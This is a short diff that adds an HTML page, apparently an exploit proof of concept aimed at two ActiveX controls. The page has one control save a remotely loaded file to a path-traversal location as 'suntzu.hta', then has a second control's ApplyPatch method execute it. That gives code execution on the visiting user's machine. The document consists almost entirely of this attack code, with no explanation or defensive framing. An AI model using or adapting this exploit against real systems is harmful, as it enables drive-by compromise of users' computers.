@@ -1,0 +1,41 @@
+&lt;HTML&gt;
+&lt;OBJECT CLASSID=&quot;clsid:A662DA7E-CCB7-4743-B71A-D817F6D575DF&quot;
+WIDTH=&quot;640&quot; HEIGHT=&quot;480&quot;
+id=&#039;CExpressViewerControl&#039; &gt;
+&lt;PARAM NAME=&quot;Src&quot;
+VALUE=&quot;http://www.example.com/suntzu.dwf&quot;&gt;
+&lt;/OBJECT&gt; 
+&lt;OBJECT CLASSID=&#039;clsid:89EC7921-729B-4116-A819-DF86A4A5776B&#039; 
+id=&#039;UpdateEngine&#039; /&gt;
+&lt;/OBJECT&gt;
+&lt;script type=&quot;text/javascript&quot;&gt;
+&lt;!-- 
+   strPatchFile = &quot;..\\..\\..\\..\\..\\..\\..\\suntzu.hta&quot;;
+
+try
+{
+   CExpressViewerControl.SaveAS (strPatchFile); 
+}
+catch(e)
+{
+   document.write(&quot;impossible to save suntzu.hta ...&quot;);
+}
+finally
+{
+}
+   strProductCode=&quot;whatever&quot; ;
+
+try
+{
+   UpdateEngine.ApplyPatch (strProductCode , strPatchFile);
+}
+catch(e)
+{
+   document.write(&quot;impossible to execute suntzu.hta ...&quot;);
+}
+finally
+{
+}
+
+--&gt; 
+&lt;/script&gt;
